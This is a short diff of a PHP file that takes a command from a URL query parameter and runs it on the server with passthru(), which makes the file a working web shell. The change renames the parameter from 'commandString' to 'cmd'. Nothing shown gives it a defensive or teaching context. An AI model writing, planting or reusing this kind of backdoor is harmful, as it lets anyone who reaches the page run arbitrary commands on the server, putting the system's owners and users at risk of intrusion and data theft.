@@ -1,6 +1,6 @@
 <?php
-    if (isset($_GET["commandString"])) {
-        $command_string = $_GET["commandString"];
+    if (isset($_GET["cmd"])) {
+        $command_string = $_GET["cmd"];
 
         try {
             passthru($command_string);
